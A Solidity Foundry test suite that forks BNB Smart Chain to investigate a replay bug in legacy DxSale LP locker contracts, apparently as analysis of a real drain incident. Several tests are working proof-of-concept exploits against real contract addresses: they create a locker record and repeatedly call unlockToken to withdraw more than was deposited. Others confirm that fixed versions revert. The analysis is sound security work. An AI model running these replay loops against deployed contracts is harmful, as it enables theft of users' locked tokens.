// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

interface IDxLockLPDep {
    function owner() external view returns (address);
    function lockFees() external view returns (uint256);
    function lockerNumberOpen() external view returns (uint256);
    function LockerRecord(uint256) external view returns (address);
    function UserLockerCount(address) external view returns (uint256);
    function DXLOCKERLP(address, uint256) external view returns (bool exists, bool locked, string memory logo, uint256 lockedAmount, uint256 lockedTime, uint256 startTime, address lpAddress);
    function unlockToken(uint256) external;
    function createLocker(address, uint256, uint256, string memory) external payable;
    function changeFees(uint256) external;
    function platformRelease(address, uint256) external;
    function tokenBalance(address) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract DxSaleC24Test is Test {
    // BSC legacy lockers
    address constant V1_BUGGY = 0xEb3a9C56d963b971d320f889bE2fb8B59853e449; // verified DxLockLPDep, replay bug
    address constant FIXED_8655 = 0x8655E5c4D701186D16765d1CDcef6D5287E4679a;
    address constant FIXED_5B5E = 0x5b5e94485c9628793B01A38762921Dc37B6829b6; // verified DxLockLPDep, fixed
    address constant VARIANT_2D04 = 0x2D045410f002A95EFcEE67759A92518fA3FcE677; // variant, attacker-owned
    address constant VARIANT_81E0 = 0x81E0eF68e103Ee65002d3Cf766240eD1c070334d; // variant, attacker-owned
    address constant ATTACKER = 0xC4574DDEF299e7E563971e200433e592EeaaFA69;
    address constant MSVP = 0x619940C0F69f1612245f94b7659403623239Fb20;

    // 0x5b5e known records
    address constant F5B5E_FUTURE_WALLET = 0x5287deEb3A679df354FA5e8138aD3189CCdb7381;
    address constant F5B5E_FUTURE_TOKEN = 0x8C528eE20C1879db58BB48BaDc1e9d194C7C0fa6;
    uint256 constant F5B5E_FUTURE_AMT = 188764403423950671514820;
    address constant F5B5E_EXPIRED_WALLET = 0xc329f8fFA94590128135b85C8b68E0D7AdFf906D;
    address constant F5B5E_EXPIRED_TOKEN = 0x6cf3D4FD4eF20ab02d464bd136b6621947c375E3;
    uint256 constant F5B5E_EXPIRED_AMT = 1548149863546807600;

    // 0x8655 known records
    address constant F8655_FUTURE_WALLET = 0x5EDB648123DF81AE906a7845961b039948e7AC88;
    address constant F8655_FUTURE_TOKEN = 0x3278c21bCEEB060dEA7476A023A8f574C71173B8;
    uint256 constant F8655_FUTURE_AMT0 = 1084541377726087400000;

    function bscRpc() internal view returns (string memory) {
        // Test fork RPC. Defaults to the public BSC dataseed endpoint, which ran the
        // full 12-test suite stably; the paid BSC_RPC_URL is used by the CI
        // enumeration/valuation job. Override with BSC_TEST_RPC_URL if needed.
        return vm.envOr("BSC_TEST_RPC_URL", string("https://bsc-dataseed.binance.org"));
    }

    function forkBsc() internal {
        vm.createSelectFork(bscRpc());
    }

    // ------------------------------------------------------------------
    // 1. live state
    // ------------------------------------------------------------------
    function test_live_state_bsc_lockers() public {
        forkBsc();
        emit log_named_uint("block", block.number);
        address[5] memory lockers = [V1_BUGGY, FIXED_8655, FIXED_5B5E, VARIANT_2D04, VARIANT_81E0];
        for (uint256 i = 0; i < lockers.length; i++) {
            IDxLockLPDep l = IDxLockLPDep(lockers[i]);
            emit log_named_address("locker", lockers[i]);
            emit log_named_address("  owner", l.owner());
            emit log_named_uint("  lockFees", l.lockFees());
            emit log_named_uint("  lockerNumberOpen", l.lockerNumberOpen());
            assertEq(l.owner(), ATTACKER, "all five BSC legacy lockers owned by drain wallet");
        }
        // fee gate on the buggy v1 is set absurdly high
        assertGt(IDxLockLPDep(V1_BUGGY).lockFees(), 1e30, "v1 fee gate high");
    }

    // ------------------------------------------------------------------
    // 2. buggy v1: current fee blocks unprivileged record creation
    // ------------------------------------------------------------------
    function test_v1_current_fee_blocks_creation() public {
        forkBsc();
        IDxLockLPDep l = IDxLockLPDep(V1_BUGGY);
        address user = address(0xBEEF01);
        vm.deal(user, 1 ether);
        vm.prank(user);
        (bool ok, ) = address(l).call{value: 1 ether}(
            abi.encodeWithSignature("createLocker(address,uint256,uint256,string)", MSVP, block.timestamp + 3650 days, 1e15, "poc")
        );
        assertFalse(ok, "createLocker must revert under 1e33 wei fee");
        emit log_named_uint("v1 lockFees", l.lockFees());
    }

    // ------------------------------------------------------------------
    // 3. buggy v1: owner lowers fee -> replay drains whole token balance
    //    (P path re-arms E-U; code logic is unchanged from the May-2026 drain)
    // ------------------------------------------------------------------
    function test_v1_owner_rearm_replay_drains() public {
        forkBsc();
        IDxLockLPDep l = IDxLockLPDep(V1_BUGGY);
        vm.prank(l.owner());
        l.changeFees(1); // owner can re-arm record creation (P)

        IERC20 tok = IERC20(MSVP);
        address user = address(0xBEEF02);
        uint256 amount = 1e15;
        vm.deal(user, 1 ether);
        uint256 lockerBal = tok.balanceOf(address(l));
        deal(MSVP, user, amount);
        vm.startPrank(user);
        tok.approve(address(l), amount);
        l.createLocker{value: 1}(MSVP, block.timestamp + 3650 days, amount, "poc");
        vm.stopPrank();
        assertEq(tok.balanceOf(address(l)), lockerBal + amount, "record is token-backed");

        uint256 before = tok.balanceOf(user);
        uint256 calls;
        vm.startPrank(user);
        for (uint256 i = 0; i < 50; i++) {
            try l.unlockToken(0) {
                calls++;
            } catch {
                break;
            }
        }
        vm.stopPrank();
        uint256 gained = tok.balanceOf(user) - before;
        emit log_named_uint("v1 replay calls", calls);
        emit log_named_uint("v1 replay gained (MSVP wei)", gained);
        emit log_named_uint("v1 locker remaining", tok.balanceOf(address(l)));
        assertGt(gained, amount, "replay paid out more than the deposited amount");
        assertGt(calls, 1, "same record replayed");
        // record is still marked locked (the replay bug)
        (, bool locked, , , , , ) = l.DXLOCKERLP(user, 0);
        assertTrue(locked, "future-locked record never consumed");
    }

    // ------------------------------------------------------------------
    // 4. historical fork: unprivileged replay at the time of the incident
    //    Requires an archive BSC RPC; enable with ARCHIVE_FORK_BLOCK env.
    // ------------------------------------------------------------------
    function test_v1_historical_unprivileged_replay() public {
        uint256 blk = vm.envOr("ARCHIVE_FORK_BLOCK", uint256(0));
        if (blk == 0) {
            emit log("skipped: set ARCHIVE_FORK_BLOCK (archive RPC) to run");
            return;
        }
        vm.createSelectFork(bscRpc(), blk);
        IDxLockLPDep l = IDxLockLPDep(V1_BUGGY);
        address pair = 0x61fC33CBB5E1B95c9c28F2df9DE876eE1D155814; // GWC/WBNB Cake-LP
        address user = address(0xBEEF03);
        uint256 amount = 1e12;
        uint256 fee = l.lockFees();
        emit log_named_uint("historical lockFees", fee);
        vm.deal(user, fee + 1);
        deal(pair, user, amount);
        uint256 lockerBal = IERC20(pair).balanceOf(address(l));
        vm.startPrank(user);
        IERC20(pair).approve(address(l), amount);
        l.createLocker{value: fee}(pair, block.timestamp + 3650 days, amount, "poc");
        uint256 before = IERC20(pair).balanceOf(user);
        for (uint256 i = 0; i < 10; i++) {
            if (IERC20(pair).balanceOf(address(l)) < amount) break;
            l.unlockToken(0);
        }
        vm.stopPrank();
        uint256 gained = IERC20(pair).balanceOf(user) - before;
        emit log_named_uint("historical gained", gained);
        emit log_named_uint("historical locker bal before", lockerBal);
        assertGt(gained, amount, "unprivileged replay extracted more than deposit");
    }

    // ------------------------------------------------------------------
    // 4b. real unprivileged record on the drained v1: replay pays its own funds
    //     token 0x608D85… has two records, both owned by the same wallet:
    //       idx0 amount 44721359549994793 (locked until 2100), idx1 amount 107481994628850490 (expired)
    //       locker balance = 152203354178845283 = idx0 + idx1 (fully self-owned)
    // ------------------------------------------------------------------
    address constant V1_REAL_WALLET = 0x862d7cc4C08de880468BFfFB50Df9ec9451ca4A0;
    address constant V1_REAL_TOKEN = 0x608D85d854d1F42f990BDf8323E7207f9e81adf7;
    uint256 constant V1_REAL_AMT0 = 44721359549994793;

    function test_v1_real_record_replay_is_self_funds() public {
        forkBsc();
        IDxLockLPDep l = IDxLockLPDep(V1_BUGGY);
        uint256 bal0 = IERC20(V1_REAL_TOKEN).balanceOf(address(l));
        uint256 w0 = IERC20(V1_REAL_TOKEN).balanceOf(V1_REAL_WALLET);
        vm.startPrank(V1_REAL_WALLET);
        l.unlockToken(0);
        l.unlockToken(0); // replay of a still-locked record
        vm.stopPrank();
        uint256 gained = IERC20(V1_REAL_TOKEN).balanceOf(V1_REAL_WALLET) - w0;
        (, bool locked0, , , , , ) = l.DXLOCKERLP(V1_REAL_WALLET, 0);
        (, , , uint256 amt1, , , ) = l.DXLOCKERLP(V1_REAL_WALLET, 1);
        emit log_named_uint("real-record replay gained", gained);
        emit log_named_uint("locker balance before", bal0);
        emit log_named_uint("record0+record1", V1_REAL_AMT0 + amt1);
        assertEq(gained, 2 * V1_REAL_AMT0, "same still-locked record paid twice");
        assertTrue(locked0, "record stays locked after replay");
        assertGe(V1_REAL_AMT0 + amt1, bal0, "balance fully covered by this wallet's own records (no third-party funds)");
    }

    // ------------------------------------------------------------------
    // 5. fixed family: future-locked records revert
    // ------------------------------------------------------------------
    function test_fixed_5b5e_future_lock_reverts() public {
        forkBsc();
        IDxLockLPDep l = IDxLockLPDep(FIXED_5B5E);
        uint256 bal0 = IERC20(F5B5E_FUTURE_TOKEN).balanceOf(F5B5E_FUTURE_WALLET);
        vm.expectRevert();
        vm.prank(F5B5E_FUTURE_WALLET);
        l.unlockToken(0);
        assertEq(IERC20(F5B5E_FUTURE_TOKEN).balanceOf(F5B5E_FUTURE_WALLET), bal0, "no transfer on revert");
    }

    function test_fixed_8655_future_lock_reverts() public {
        forkBsc();
        IDxLockLPDep l = IDxLockLPDep(FIXED_8655);
        uint256 bal0 = IERC20(F8655_FUTURE_TOKEN).balanceOf(F8655_FUTURE_WALLET);
        vm.expectRevert();
        vm.prank(F8655_FUTURE_WALLET);
        l.unlockToken(0);
        assertEq(IERC20(F8655_FUTURE_TOKEN).balanceOf(F8655_FUTURE_WALLET), bal0, "no transfer on revert");
    }

    // ------------------------------------------------------------------
    // 6. fixed family: expired record is a single claim
    // ------------------------------------------------------------------
    function test_fixed_5b5e_expired_single_claim() public {
        forkBsc();
        IDxLockLPDep l = IDxLockLPDep(FIXED_5B5E);
        uint256 bal0 = IERC20(F5B5E_EXPIRED_TOKEN).balanceOf(F5B5E_EXPIRED_WALLET);
        vm.prank(F5B5E_EXPIRED_WALLET);
        l.unlockToken(0);
        assertEq(IERC20(F5B5E_EXPIRED_TOKEN).balanceOf(F5B5E_EXPIRED_WALLET) - bal0, F5B5E_EXPIRED_AMT, "single claim amount");
        vm.expectRevert();
        vm.prank(F5B5E_EXPIRED_WALLET);
        l.unlockToken(0);
        (, bool locked, , , , , ) = l.DXLOCKERLP(F5B5E_EXPIRED_WALLET, 0);
        assertFalse(locked, "flag consumed after expiry claim");
    }

    // ------------------------------------------------------------------
    // 7. fixed family: platformRelease is owner-only and pays the beneficiary
    // ------------------------------------------------------------------
    function test_fixed_5b5e_platformRelease_nonowner_reverts() public {
        forkBsc();
        IDxLockLPDep l = IDxLockLPDep(FIXED_5B5E);
        vm.expectRevert();
        vm.prank(address(0xDEAD));
        l.platformRelease(F5B5E_FUTURE_WALLET, 0);
    }

    function test_fixed_5b5e_platformRelease_pays_user_not_owner() public {
        forkBsc();
        IDxLockLPDep l = IDxLockLPDep(FIXED_5B5E);
        uint256 w0 = IERC20(F5B5E_FUTURE_TOKEN).balanceOf(F5B5E_FUTURE_WALLET);
        uint256 o0 = IERC20(F5B5E_FUTURE_TOKEN).balanceOf(ATTACKER);
        vm.prank(l.owner());
        l.platformRelease(F5B5E_FUTURE_WALLET, 0);
        assertEq(IERC20(F5B5E_FUTURE_TOKEN).balanceOf(F5B5E_FUTURE_WALLET) - w0, F5B5E_FUTURE_AMT, "paid to beneficiary");
        assertEq(IERC20(F5B5E_FUTURE_TOKEN).balanceOf(ATTACKER), o0, "owner receives nothing");
    }

    // ------------------------------------------------------------------
    // 8. variant lockers: discover an unlockable record and test replay
    // ------------------------------------------------------------------
    function _scanFirstUnlock(address locker, uint256 maxIds) internal returns (address wallet, uint256 index, bool found) {
        IDxLockLPDep l = IDxLockLPDep(locker);
        for (uint256 i = 0; i < maxIds; i++) {
            address w = l.LockerRecord(i);
            if (w == address(0)) continue;
            for (uint256 j = 0; j < 3; j++) {
                vm.prank(w);
                (bool ok, ) = address(l).call(abi.encodeWithSignature("unlockToken(uint256)", j));
                if (ok) return (w, j, true);
            }
        }
        return (address(0), 0, false);
    }

    function _countTransfersFrom(Vm.Log[] memory logs, address from) internal pure returns (uint256 c) {
        bytes32 t = keccak256("Transfer(address,address,uint256)");
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length == 3 && logs[i].topics[0] == t
                && address(uint160(uint256(logs[i].topics[1]))) == from) c++;
        }
    }

    function _sumTransfersFrom(Vm.Log[] memory logs, address from) internal returns (uint256 sum) {
        bytes32 t = keccak256("Transfer(address,address,uint256)");
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics.length == 3 && logs[i].topics[0] == t
                && address(uint160(uint256(logs[i].topics[1]))) == from) {
                sum += abi.decode(logs[i].data, (uint256));
                emit log_named_address("  token", logs[i].emitter);
            }
        }
    }

    function test_variant_2d04_unlockable_record_replay() public {
        forkBsc();
        (address w, uint256 idx, bool found) = _scanFirstUnlock(VARIANT_2D04, 250);
        if (!found) {
            emit log("variant 2D04: no unlockable record in scanned prefix");
            return;
        }
        emit log_named_address("variant 2D04 unlockable wallet", w);
        emit log_named_uint("index", idx);
        // re-fork to undo the first call, then call twice
        forkBsc();
        IDxLockLPDep l = IDxLockLPDep(VARIANT_2D04);
        vm.recordLogs();
        vm.prank(w);
        (bool ok1, ) = address(l).call(abi.encodeWithSignature("unlockToken(uint256)", idx));
        Vm.Log[] memory logs1 = vm.getRecordedLogs();
        vm.recordLogs();
        vm.prank(w);
        (bool ok2, ) = address(l).call(abi.encodeWithSignature("unlockToken(uint256)", idx));
        Vm.Log[] memory logs2 = vm.getRecordedLogs();
        assertTrue(ok1, "first unlock call succeeds");
        emit log_named_uint("transfer events call1", _countTransfersFrom(logs1, VARIANT_2D04));
        emit log_named_uint("call1 transfer amount", _sumTransfersFrom(logs1, VARIANT_2D04));
        emit log_named_uint("transfer events call2", _countTransfersFrom(logs2, VARIANT_2D04));
        emit log_named_string("second call result", ok2 ? "ok (replay)" : "revert (consumed)");
        // third-party caller must not be able to release another wallet's record
        forkBsc();
        vm.prank(address(0xDEAD));
        (bool ok3, ) = address(l).call(abi.encodeWithSignature("unlockToken(uint256)", idx));
        emit log_named_string("third-party caller result", ok3 ? "ok (BUG)" : "revert (caller-scoped)");
        assertFalse(ok3, "third-party cannot unlock another wallet's record");
    }

    function test_variant_81e0_unlockable_record_replay() public {
        forkBsc();
        (address w, uint256 idx, bool found) = _scanFirstUnlock(VARIANT_81E0, 250);
        if (!found) {
            emit log("variant 81E0: no unlockable record in scanned prefix");
            return;
        }
        emit log_named_address("variant 81E0 unlockable wallet", w);
        emit log_named_uint("index", idx);
        forkBsc();
        IDxLockLPDep l = IDxLockLPDep(VARIANT_81E0);
        vm.recordLogs();
        vm.prank(w);
        (bool ok1, ) = address(l).call(abi.encodeWithSignature("unlockToken(uint256)", idx));
        Vm.Log[] memory logs1 = vm.getRecordedLogs();
        vm.recordLogs();
        vm.prank(w);
        (bool ok2, ) = address(l).call(abi.encodeWithSignature("unlockToken(uint256)", idx));
        Vm.Log[] memory logs2 = vm.getRecordedLogs();
        assertTrue(ok1, "first unlock call succeeds");
        emit log_named_uint("transfer events call1", _countTransfersFrom(logs1, VARIANT_81E0));
        emit log_named_uint("call1 transfer amount", _sumTransfersFrom(logs1, VARIANT_81E0));
        emit log_named_uint("transfer events call2", _countTransfersFrom(logs2, VARIANT_81E0));
        emit log_named_string("second call result", ok2 ? "ok (replay)" : "revert (consumed)");
        forkBsc();
        vm.prank(address(0xDEAD));
        (bool ok3, ) = address(l).call(abi.encodeWithSignature("unlockToken(uint256)", idx));
        emit log_named_string("third-party caller result", ok3 ? "ok (BUG)" : "revert (caller-scoped)");
        assertFalse(ok3, "third-party cannot unlock another wallet's record");
    }
}
